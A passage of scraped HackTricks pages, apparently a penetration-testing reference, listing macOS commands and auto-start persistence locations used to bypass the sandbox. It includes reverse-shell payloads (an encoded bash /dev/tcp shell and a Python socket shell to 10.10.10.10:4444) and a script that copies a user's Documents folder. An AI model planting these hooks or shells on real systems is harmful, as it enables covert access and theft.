list\n#List services\natq\n#List \"at\" tasks for the user\nsysctl\n-a\n#List kernel configuration\ndiskutil list\n#List connected hard drives\nnettop\n#Monitor network usage of processes in top style\n‚Äã\nsystem_profiler SPSoftwareDataType\n#System info\nsystem_profiler SPPrintersDataType\n#Printer\nsystem_profiler SPApplicationsDataType\n#Installed Apps\nsystem_profiler SPFrameworksDataType\n#Instaled framework\nsystem_profiler SPDeveloperToolsDataType\n#Developer tools info\nsystem_profiler SPStartupItemDataType\n#Startup Items\nsystem_profiler SPNetworkDataType\n#Network Capabilities\nsystem_profiler SPFirewallDataType\n#Firewall Status\nsystem_profiler SPNetworkLocationDataType\n#Known Network\nsystem_profiler SPBluetoothDataType\n#Bluetooth Info\nsystem_profiler SPEthernetDataType\n#Ethernet Info\nsystem_profiler SPUSBDataType\n#USB info\nsystem_profiler SPAirPortDataType\n#Airport Info\n‚Äã\n‚Äã\n#Searches\nmdfind password\n#Show all the files that contains the word password\nmfind\n-name\npassword\n#List all the files containing the word password in the name\n‚Äã\n‚Äã\n#Open any app\nopen\n-a\n<\nApplication Name\n>\n--hide\n#Open app hidden\nopen\nsome.doc\n-a\nTextEdit\n#Open a file in one application\n‚Äã\n‚Äã\n#Computer doesn't go to sleep\ncaffeinate\n&\n‚Äã\n‚Äã\n#Screenshot\n# This will ask for permission to the user\nscreencapture\n-x\n/tmp/ss.jpg\n#Save screenshot in that file\n‚Äã\n‚Äã\n#Get clipboard info\npbpaste\n‚Äã\n‚Äã\n#system_profiler\nsystem_profiler\n--help\n#This command without arguments take lot of memory and time.\nsystem_profiler\n-listDataTypes\nsystem_profiler SPSoftwareDataType SPNetworkDataType\n‚Äã\n‚Äã\n#Network\narp\n-i\nen0\n-l\n-a\n#Print the macOS device's ARP table\nlsof\n-i\n-P\n-n\n|\ngrep\nLISTEN\nsmbutil statshares\n-a\n#View smb shares mounted to the hard drive\n‚Äã\n#networksetup - set or view network options: Proxies, FW options and more\nnetworksetup\n-listallnetworkservices\n#List network services\nnetworksetup\n-listallhardwareports\n#Hardware ports\nnetworksetup\n-getinfo\nWi-Fi\n#Wi-Fi info\nnetworksetup\n-getautoproxyurl\nWi-Fi\n#Get proxy URL for Wifi\nnetworksetup\n-getwebproxy\nWi-Fi\n#Wifi Web proxy\nnetworksetup\n-getftpproxy\nWi-Fi\n#Wifi ftp proxy\n‚Äã\n‚Äã\n#Brew\nbrew list\n#List installed\nbrew search\n<\ntext\n>\n#Search package\nbrew info\n<\nformula\n>\nbrew\ninstall\n<\nformula\n>\nbrew uninstall\n<\nformula\n>\nbrew cleanup\n#Remove older versions of installed formulae.\nbrew cleanup\n<\nformula\n>\n#Remove older versions of specified formula.\n‚Äã\n‚Äã\n#Make the machine talk\nsay hello\n-v\ndiego\n#spanish: diego, Jorge, Monica\n#mexican: Juan, Paulina\n#french: Thomas, Amelie\n‚Äã\n########### High privileges actions\nsudo\npurge\n#purge RAM\n#Sharing preferences\nsudo\nlaunchctl load\n-w\n/System/Library/LaunchDaemons/ssh.plist\n(\nenable\nssh\n)\nsudo\nlaunchctl unload /System/Library/LaunchDaemons/ssh.plist\n(\ndisable\nssh\n)\n#Start apache\nsudo\napachectl\n(\nstart\n|\nstatus\n|\nrestart\n|\nstop\n)\n##Web folder: /Library/WebServer/Documents/\n#Remove DNS cache\ndscacheutil\n-flushcache\nsudo\nkillall\n-HUP\nmDNSResponder\nInstalled Software & Services\nCheck for\nsuspicious\napplications installed and\nprivileges\nover the.installed resources:\nsystem_profiler SPApplicationsDataType #Installed Apps\nsystem_profiler SPFrameworksDataType #Instaled framework\nlsappinfo list #Installed Apps\nlaunchtl list #Services\nUser Processes\n# will print all the running services under that particular user domain.\nlaunchctl print gui/\n<\nusers\nUID\n>\n‚Äã\n# will print all the running services under root\nlaunchctl print system\n‚Äã\n# will print detailed information about the specific launch agent. And if it‚Äôs not running or you‚Äôve mistyped, you will get some output with a non-zero exit code: Could not find service ‚Äúcom.company.launchagent.label‚Äù in domain for login\nlaunchctl print gui/\n<\nuser's\nUID\n>\n/com.company.launchagent.label\nCreate a user\nWithout prompts\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nmacOS Keychain\nNext\n- MacOS Hardening\nmacOS Auto Start\nLast modified\n5mo ago"
    },
    {
        "title": "macOS Auto Start",
        "url": "https://book.hacktricks.xyz/macos-hardening/macos-auto-start-locations",
        "text": "macOS Auto Start\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThis section is heavily based on the blog series\nBeyond the good ol' LaunchAgents\n, the goal is to add\nmore Autostart Locations\n(if possible), indicate\nwhich techniques are still working\nnowadays with latest version of macOS (13.4) and to specify the\npermissions\nneeded.\nSandbox Bypass\nHere you can find start locations useful for\nsandbox bypass\nthat allows you to simply execute something by\nwriting it into a file\nand\nwaiting\nfor a very\ncommon\naction\n, a determined\namount of time\nor an\naction you can usually perform\nfrom inside a snadbox without needing root permissions.\nLaunchd\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocations\n/Library/LaunchAgents\nTrigger\n: Reboot\nRoot required\n/Library/LaunchDaemons\nTrigger\n: Reboot\nRoot required\n/System/Library/LaunchAgents\nTrigger\n: Reboot\nRoot required\n/System/Library/LaunchDaemons\nTrigger\n: Reboot\nRoot required\n~/Library/LaunchAgents\nTrigger\n: Relog-in\n~/Library/LaunchDemons\nTrigger\n: Relog-in\nDescription & Exploitation\nlaunchd\nis the\nfirst\nprocess\nexecuted by OX S kernel at startup and the last one to finish at shut down. It should always have the\nPID 1\n. This process will\nread and execute\nthe configurations indicated in the\nASEP\nplists\nin:\n/Library/LaunchAgents\n: Per-user agents installed by the admin\n/Library/LaunchDaemons\n: System-wide daemons installed by the admin\n/System/Library/LaunchAgents\n: Per-user agents provided by Apple.\n/System/Library/LaunchDaemons\n: System-wide daemons provided by Apple.\nWhen a user logs in the plists located in\n/Users/$USER/Library/LaunchAgents\nand\n/Users/$USER/Library/LaunchDemons\nare started with the\nlogged users permissions\n.\nThe\nmain difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup\n(as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nplist\nPUBLIC\n\"-//Apple//DTD PLIST 1.0//EN\"\n>\n<\nplist\nversion\n=\n\"\n1.0\n\"\n>\n<\ndict\n>\n<\nkey\n>\nLabel\n</\nkey\n>\n<\nstring\n>\ncom.apple.someidentifier\n</\nstring\n>\n<\nkey\n>\nProgramArguments\n</\nkey\n>\n<\narray\n>\n<\nstring\n>\nbash -c 'touch /tmp/launched'\n</\nstring\n>\n<!--Prog to execute-->\n</\narray\n>\n<\nkey\n>\nRunAtLoad\n</\nkey\n>\n<\ntrue\n/>\n<!--Execute at system startup-->\n<\nkey\n>\nStartInterval\n</\nkey\n>\n<\ninteger\n>\n800\n</\ninteger\n>\n<!--Execute each 800s-->\n<\nkey\n>\nKeepAlive\n</\nkey\n>\n<\ndict\n>\n<\nkey\n>\nSuccessfulExit\n</\nkey\n>\n</\nfalse\n>\n<!--Re-execute if exit unsuccessful-->\n<!--If previous is true, then re-execute in successful exit-->\n</\ndict\n>\n</\ndict\n>\n</\nplist\n>\nThere are cases where an\nagent needs to be executed before the user logins\n, these are called\nPreLoginAgents\n. For example, this is useful to provide assistive technology at login. They can be found also in\n/Library/LaunchAgents\n(see\nhere\nan example).\nNew Daemons or Agents config files will be\nloaded after next reboot or using\nlaunchctl load <target.plist>\nIt's\nalso possible to load .plist files without that extension\nwith\nlaunchctl -F <file>\n(however those plist files won't be automatically loaded after reboot).\nIt's also possible to\nunload\nwith\nlaunchctl unload <target.plist>\n(the process pointed by it will be terminated),\nTo\nensure\nthat there isn't\nanything\n(like an override)\npreventing\nan\nAgent\nor\nDaemon\nfrom\nrunning\nrun:\nsudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist\nList all the agents and daemons loaded by the current user:\nlaunchctl list\nIf a plist is owned by a user, even if it's in a daemon system wide folders, the\ntask will be executed as the user\nand not as root. This can prevent some privilege escalation attacks.\nshell startup files\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0001/\nWriteup (xterm):\nhttps://theevilbit.github.io/beyond/beyond_0018/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocations\n~/.zshrc\n,\n~/.zlogin\n,\n~/.zshenv\n,\n~/.zprofile\nTrigger\n: Open a terminal with zsh\n/etc/zshenv\n,\n/etc/zprofile\n,\n/etc/zshrc\n,\n/etc/zlogin\nTrigger\n: Open a terminal with zsh\nRoot required\n~/.zlogout\nTrigger\n: Exit a terminal with zsh\n/etc/zlogout\nTrigger\n: Exit a terminal with zsh\nRoot required\nPotentially more in:\nman zsh\n~/.bashrc\nTrigger\n: Open a terminal with bash\n/etc/profile\n(didn't work)\n~/.profile\n(didn't work)\n~/.xinitrc\n,\n~/.xserverrc\n,\n/opt/X11/etc/X11/xinit/xinitrc.d/\nTrigger\n: Expected to trigger with xterm, but it\nisn't installed\nand even after installed this error is thrown: xterm:\nDISPLAY is not set\nDescription & Exploitation\nShell startup files are executed when our shell environment like\nzsh\nor\nbash\nis\nstarting up\n. macOS defaults to\n/bin/zsh\nthese days, and\nwhenever we open\nTerminal\nor SSH\ninto the device, this is the shell environment we are placed into.\nbash\nand\nsh\nare still available, however they have to be specifically started.\nThe man page of zsh, which we can read with\nman zsh\nhas a long description of the startup files.\n# Example executino via ~/.zshrc\necho\n\"touch /tmp/hacktricks\"\n>>\n~/.zshrc\nRe-opened Applications\nConfiguring the indicated exploitation and loging-out and loging-in or even rebooting didn't work for me to execute the app. (The app wasn't being executed, maybe it needs to be running when these actions are performed)\nWriteup\n:\nhttps://theevilbit.github.io/beyond/beyond_0021/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocation\n~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist\nTrigger\n: Restart reopening applications\nDescription & Exploitation\nAll the applications to reopen are inside the plist\n~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist\nSo, make the reopen applications launch your own one, you just need to\nadd your app to the list\n.\nThe UUID can be found listing that directory or with\nioreg -rd1 -c IOPlatformExpertDevice | awk -F'\"' '/IOPlatformUUID/{print $4}'\nTo check the applications that will be reopened you can do:\ndefaults\n-currentHost\nread\ncom.apple.loginwindow TALAppsToRelaunchAtLogin\n#or\nplutil\n-p\n~/Library/Preferences/ByHost/com.apple.loginwindow.\n<\nUUID\n>\n.plist\nTo\nadd an application to this list\nyou can use:\n# Adding iTerm2\n/usr/libexec/PlistBuddy\n-c\n\"Add :TALAppsToRelaunchAtLogin: dict\"\n\\\n-c\n\"Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2\"\n\\\n-c\n\"Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2\"\n\\\n-c\n\"Set :TALAppsToRelaunchAtLogin:$:Hide 0\"\n\\\n-c\n\"Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app\"\n\\\n~/Library/Preferences/ByHost/com.apple.loginwindow.\n<\nUUID\n>\n.plist\nTerminal Preferences\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocation\n~/Library/Preferences/com.apple.Terminal.plist\nTrigger\n: Open Terminal\nDescription & Exploitation\nIn\n~/Library/Preferences\nare store the preferences of the user in the Applications. Some of these preferences can hold a configuration to\nexecute other applications/scripts\n.\nFor example, the Terminal can execute a command in the Startup:\nThis config is reflected in the file\n~/Library/Preferences/com.apple.Terminal.plist\nlike this:\n[..\n.\n]\n\"Window Settings\"\n=>\n{\n\"Basic\"\n=>\n{\n\"CommandString\"\n=>\n\"touch /tmp/terminal_pwn\"\n\"Font\"\n=>\n{\nlength\n=\n267\n, bytes\n=\n0x62706c69\n73743030\nd4010203 04050607\n..\n. 00000000 000000cf\n}\n\"FontAntialias\"\n=>\n1\n\"FontWidthSpacing\"\n=>\n1.004032258064516\n\"name\"\n=>\n\"Basic\"\n\"ProfileCurrentVersion\"\n=>\n2.07\n\"RunCommandAsShell\"\n=>\n0\n\"type\"\n=>\n\"Window Settings\"\n}\n[..\n.\n]\nSo, if the plist of the preferences of the terminal in the system could be overwritten, the the\nopen\nfunctionality can be used to\nopen the terminal and that command will be executed\n.\nYou can add this from the cli with:\n# Add\n/usr/libexec/PlistBuddy\n-c\n\"Set :\n\\\"\nWindow Settings\n\\\"\n:\n\\\"\nBasic\n\\\"\n:\n\\\"\nCommandString\n\\\"\n'touch /tmp/terminal-start-command'\"\n$HOME\n/Library/Preferences/com.apple.Terminal.plist\n/usr/libexec/PlistBuddy\n-c\n\"Set :\n\\\"\nWindow Settings\n\\\"\n:\n\\\"\nBasic\n\\\"\n:\n\\\"\nRunCommandAsShell\n\\\"\n0\"\n$HOME\n/Library/Preferences/com.apple.Terminal.plist\n‚Äã\n# Remove\n/usr/libexec/PlistBuddy\n-c\n\"Set :\n\\\"\nWindow Settings\n\\\"\n:\n\\\"\nBasic\n\\\"\n:\n\\\"\nCommandString\n\\\"\n''\"\n$HOME\n/Library/Preferences/com.apple.Terminal.plist\nTerminal Scripts\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocation\nAnywhere\nTrigger\n: Open Terminal\nDescription & Exploitation\nIf you create a\n.terminal\nscript\nand opens, the\nTerminal application\nwill be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.\nTry it with:\n# Prepare the payload\ncat\n>\n/tmp/test.terminal\n<<\nEOF\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>CommandString</key>\n<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>\n<key>ProfileCurrentVersion</key>\n<real>2.0600000000000001</real>\n<key>RunCommandAsShell</key>\n<false/>\n<key>name</key>\n<string>exploit</string>\n<key>type</key>\n<string>Window Settings</string>\n</dict>\n</plist>\nEOF\n‚Äã\n# Trigger it\nopen\n/tmp/test.terminal\n‚Äã\n# Use something like the following for a reverse shell:\n<\nstring\n>\necho\n-n\n\"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==\"\n|\nbase64\n-d\n|\nbash\n;\n<\n/string\n>\nIf terminal has\nFull Disk Access\nit will be able to complete that action (note that the command executed will be visible in a terminal window).\nAudio Plugins\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0013/\nWriteup:\nhttps://posts.specterops.io/audio-unit-plug-ins-896d3434a882\n‚Äã\nLocation\n/Library/Audio/Plug-Ins/HAL\nRoot required\nTrigger\n: Restart coreaudiod or the computer\n/Library/Audio/Plug-ins/Components\nRoot required\nTrigger\n: Restart coreaudiod or the computer\n~/Library/Audio/Plug-ins/Components\nTrigger\n: Restart coreaudiod or the computer\n/System/Library/Components\nRoot required\nTrigger\n: Restart coreaudiod or the computer\nDescription\nAccording to the previous writeups it's possible to\ncompile some audio plugins\nand get them loaded.\nQuickLook Plugins\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0028/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocation\n/System/Library/QuickLook\n/Library/QuickLook\n~/Library/QuickLook\n/Applications/AppNameHere/Contents/Library/QuickLook/\n~/Applications/AppNameHere/Contents/Library/QuickLook/\nDescription & Exploitation\nQuickLook plugins can be executed when you\ntrigger the preview of a file\n(press space bar with the file selected in Finder) and a\nplugin supporting that file type\nis installed.\nIt's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.\nLogin/Logout Hooks\nThis didn't work for me, neither with the user LoginHook nor with the root LogoutHook\nWriteup\n:\nhttps://theevilbit.github.io/beyond/beyond_0022/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocation\nYou need to be able to execute something like\ndefaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh\nLo\ncated in\n~/Library/Preferences/com.apple.loginwindow.plist\nThey are deprecated but can be used to execute commands when a user logs in.\ncat\n>\n$HOME\n/hook.sh\n<<\nEOF\n#!/bin/bash\necho 'My is: \\\n`\nid\n\\\n`\n' > /tmp/login_id.txt\nEOF\nchmod\n+x\n$HOME\n/hook.sh\ndefaults\nwrite\ncom.apple.loginwindow LoginHook /Users/\n$USER\n/hook.sh\ndefaults\nwrite\ncom.apple.loginwindow LogoutHook /Users/\n$USER\n/hook.sh\nThis setting is stored in\n/Users/$USER/Library/Preferences/com.apple.loginwindow.plist\ndefaults\nread\n/Users/\n$USER\n/Library/Preferences/com.apple.loginwindow.plist\n{\nLoginHook\n=\n\"/Users/username/hook.sh\"\n;\nLogoutHook\n=\n\"/Users/username/hook.sh\"\n;\nMiniBuddyLaunch\n=\n0\n;\nTALLogoutReason\n=\n\"Shut Down\"\n;\nTALLogoutSavesState\n=\n0\n;\noneTimeSSMigrationComplete\n=\n1\n;\n}\nTo delete it:\ndefaults delete com.apple.loginwindow LoginHook\ndefaults delete com.apple.loginwindow LogoutHook\nThe root user one is stored in\n/private/var/root/Library/Preferences/com.apple.loginwindow.plist\nConditional Sandbox Bypass\nHere you can find start locations useful for\nsandbox bypass\nthat allows you to simply execute something by\nwriting it into a file\nand\nexpecting not super common conditions\nlike specific\nprograms installed, \"uncommon\" user\nactions or environments.\nCron\nWriteup\n:\nhttps://theevilbit.github.io/beyond/beyond_0004/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nHowever, you need to be able to execute\ncrontab\nbinary\nOr be root\nLocation\n/usr/lib/cron/tabs/\n,\n/private/var/at/tabs\n,\n/private/var/at/jobs\n,\n/etc/periodic/\nRoot required for direct write access. No root required if you can execute\ncrontab <file>\nTrigger\n: Depends on the cron job\nDescription & Exploitation\nList the cron jobs of the\ncurrent user\nwith:\ncrontab\n-l\nYou can also see all the cron jobs of the users in\n/usr/lib/cron/tabs/\nand\n/var/at/tabs/\n(needs root).\nIn MacOS several folders executing scripts with\ncertain frequency\ncan be found in:\n# The one with the cron jobs is /usr/lib/cron/tabs/\nls\n-lR\n/usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/\nThere you can find the regular\ncron\njobs\n, the\nat\njobs\n(not very used) and the\nperiodic\njobs\n(mainly used for cleaning temporary files). The daily periodic jobs can be executed for example with:\nperiodic daily\n.\nTo add a\nuser cronjob programatically\nit's possible to use:\necho\n'* * * * * /bin/bash -c \"touch /tmp/cron3\"'\n>\n/tmp/cron\ncrontab\n/tmp/cron\niTerm2\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0002/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nLocations\n~/Library/Application Support/iTerm2/Scripts/AutoLaunch\nTrigger\n: Open iTerm\n~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt\nTrigger\n: Open iTerm\n~/Library/Preferences/com.googlecode.iterm2.plist\nTrigger\n: Open iTerm\nDescription & Exploitation\nScripts stored in\n~/Library/Application Support/iTerm2/Scripts/AutoLaunch\nwill be executed. For example:\ncat\n>\n\"\n$HOME\n/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh\"\n<<\nEOF\n#!/bin/bash\ntouch /tmp/iterm2-autolaunch\nEOF\n‚Äã\nchmod\n+x\n\"\n$HOME\n/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh\"\nor:\ncat\n>\n\"\n$HOME\n/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py\"\n<<\nEOF\n#!/usr/bin/env python3\nimport iterm2,socket,subprocess,os\n‚Äã\nasync def main(connection):\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect\n((\n'\n10.10.10.10\n'\n,\n4444\n))\n;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);\nasync with iterm2.CustomControlSequenceMonitor(\nconnection, \"shared-secret\", r'^create-window$') as mon:\nwhile True:\nmatch = await mon.async_get()\nawait iterm2.Window.async_create(connection)\n‚Äã\niterm2.run_forever(main)\nEOF\nThe script\n~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt\nwill also be executed:\ndo\nshell script\n\"touch /tmp/iterm2-autolaunchscpt\"\nThe iTerm2 preferences located in\n~/Library/Preferences/com.googlecode.iterm2.plist\ncan\nindicate a command to execute\nwhen the iTerm2 terminal is opened.\nThis setting can be configured in the iTerm2 settings:\nAnd the command is reflected in the preferences:\nplutil\n-p\ncom.googlecode.iterm2.plist\n{\n[..\n.\n]\n\"New Bookmarks\"\n=>\n[\n0\n=>\n{\n[..\n.\n]\n\"Initial Text\"\n=>\n\"touch /tmp/iterm-start-command\"\nYou can set the command to execute with:\n# Add\n/usr/libexec/PlistBuddy\n-c\n\"Set :\n\\\"\nNew Bookmarks\n\\\"\n:0:\n\\\"\nInitial Text\n\\\"\n'touch /tmp/iterm-start-command'\"\n$HOME\n/Library/Preferences/com.googlecode.iterm2.plist\n‚Äã\n# Call iTerm\nopen\n/Applications/iTerm.app/Contents/MacOS/iTerm2\n‚Äã\n# Remove\n/usr/libexec/PlistBuddy\n-c\n\"Set :\n\\\"\nNew Bookmarks\n\\\"\n:0:\n\\\"\nInitial Text\n\\\"\n''\"\n$HOME\n/Library/Preferences/com.googlecode.iterm2.plist\nHighly probable there are\nother ways to abuse the iTerm2 preferences\nto execute arbitrary commands.\nxbar\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0007/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nBut xbar must be installed\nLocation\n~/Library/Application\\ Support/xbar/plugins/\nTrigger\n: Once xbar is executed\nHammerspoon\nWriteup\n:\nhttps://theevilbit.github.io/beyond/beyond_0008/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nBut Hammerspoon must be installed\nLocation\n~/.hammerspoon/init.lua\nTrigger\n: Once hammerspoon is executed\nDescription\n‚Äã\nHammerspoon\nis an automation tool, that allows\nmacOS scripting through LUA scripting language\n. We can even embed full AppleScript code as well as run shell scripts.\nThe app looks for a single file,\n~/.hammerspoon/init.lua\n, and when started the script will be executed.\ncat\n>\n\"\n$HOME\n/.hammerspoon/init.lua\"\n<<\nEOF\nhs.execute(\"id > /tmp/hs.txt\")\nEOF\nSSHRC\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0006/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nBut ssh needs to be enabled and used\nLocation\n~/.ssh/rc\nTrigger\n: Login via ssh\n/etc/ssh/sshrc\nRoot required\nTrigger\n: Login via ssh\nDescription & Exploitation\nBy default, unless\nPermitUserRC no\nin\n/etc/ssh/sshd_config\n, when a user\nlogins via SSH\nthe scripts\n/etc/ssh/sshrc\nand\n~/.ssh/rc\nwill be executed.\nDescription\nIf the popular program\nxbar\nis installed, it's possible to write a shell script in\n~/Library/Application\\ Support/xbar/plugins/\nwhich will be executed when xbar is started:\ncat\n>\n\"\n$HOME\n/Library/Application Support/xbar/plugins/a.sh\"\n<<\nEOF\n#!/bin/bash\ntouch /tmp/xbar\nEOF\nchmod\n+x\n\"\n$HOME\n/Library/Application Support/xbar/plugins/a.sh\"\nLogin Items\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0003/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nBut you need to execute\nosascript\nwith args\nLocations\n~/Library/Application Support/com.apple.backgroundtaskmanagementagent\nTrigger:\nLogin\nExploit payload stored calling\nosascript\n/var/db/com.apple.xpc.launchd/loginitems.501.plist\nTrigger:\nLogin\nRoot required\nDescription\nIn System Preferences -> Users & Groups ->\nLogin Items\nyou can find\nitems to be executed when the user logs in\n.\nIt it's possible to list them, add and remove from the command line:\n#List all items:\nosascript\n-e\n'tell application \"System Events\" to get the name of every login item'\n‚Äã\n#Add an item:\nosascript\n-e\n'tell application \"System Events\" to make login item at end with properties {path:\"/path/to/itemname\", hidden:false}'\n‚Äã\n#Remove an item:\nosascript\n-e\n'tell application \"System Events\" to delete login item \"itemname\"'\nThese items are stored in the file\n~/Library/Application Support/com.apple.backgroundtaskmanagementagent\nLogin items\ncan\nalso\nbe indicated in using the API\nSMLoginItemSetEnabled\nwhich will store the configuration in\n/var/db/com.apple.xpc.launchd/loginitems.501.plist\nZIP as Login Item\n(Check previos section about Login Items, this is an extension)\nIf you store a\nZIP\nfile as a\nLogin Item\nthe\nArchive Utility\nwill open it and if the zip was for example stored in\n~/Library\nand contained the Folder\nLaunchAgents/file.plist\nwith a backdoor, that folder will be created (it isn't by default) and the plist will be added so the next time the user logs in again, the\nbackdoor indicated in the plist will be executed\n.\nAnother options would be to create the files\n.bash_profile\nand\n.zshenv\ninside the user HOME so if the folder LaunchAgents already exist this technique would still work.\nAt\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0014/\n‚Äã\nLocation\nNeed to\nexecute\nat\nand it must be\nenabled\nDescription\n‚ÄúAt tasks‚Äù are used to\nschedule tasks at specific times\n.\nThese tasks differ from cron in that\nthey are one time tasks\nt\nhat get removed after executing\n. However, they will\nsurvive a system restart\nso they can‚Äôt be ruled out as a potential threat.\nBy\ndefault\nthey are\ndisabled\nbut the\nroot\nuser can\nenable\nthem\nwith:\nsudo\nlaunchctl load\n-F\n/System/Library/LaunchDaemons/com.apple.atrun.plist\nThis will create a file in 1 hour:\necho\n\"echo 11 > /tmp/at.txt\"\n|\nat now+1\nCheck the job queue using\natq:\nsh-3.2# atq\n26\tTue Apr 27 00:46:00 2021\n22\tWed Apr 28 00:29:00 2021\nAbove we can see two jobs scheduled. We can print the details of the job using\nat -c JOBNUMBER\nsh-3.2# at -c 26\n#!/bin/sh\n#\natrun\nuid\n=\n0\ngid\n=\n0\n#\nmail csaby\n0\numask 22\nSHELL=/bin/sh; export SHELL\nTERM=xterm-256color; export TERM\nUSER=root; export USER\nSUDO_USER=csaby; export SUDO_USER\nSUDO_UID=501; export SUDO_UID\nSSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK\n__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING\nMAIL=/var/mail/root; export MAIL\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH\nPWD=/Users/csaby; export PWD\nSHLVL=1; export SHLVL\nSUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND\nHOME=/var/root; export HOME\nLOGNAME=root; export LOGNAME\nLC_CTYPE=UTF-8; export LC_CTYPE\nSUDO_GID=20; export SUDO_GID\n_=/usr/bin/at; export _\ncd /Users/csaby || {\necho 'Execution directory inaccessible' >&2\nexit 1\n}\nunset OLDPWD\necho 11 > /tmp/at.txt\nIf AT tasks aren't enabled the created tasks won't be executed.\nThe\njob files\ncan be found at\n/private/var/at/jobs/\nsh-3.2# ls -l /private/var/at/jobs/\ntotal 32\n-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ\n-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile\n-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2\n-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2\nThe filename contains the queue, the job number, and the time it‚Äôs scheduled to run. For example let‚Äôs take a loot at\na0001a019bdcd2\n.\na\n- this is the queue\n0001a\n- job number in hex,\n0x1a = 26\n019bdcd2\n- time in hex. It represents the minutes passed since epoch.\n0x019bdcd2\nis\n26991826\nin decimal. If we multiply it by 60 we get\n1619509560\n, which is\nGMT: 2021. April 27., Tuesday 7:46:00\n.\nIf we print the job file, we find that it contains the same information we got using\nat -c\n.\nFolder Actions\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0024/\nWriteup:\nhttps://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nBut you need to be able to call osascript with arguments and be able to configure Folder Actions\nLocation\n/Library/Scripts/Folder 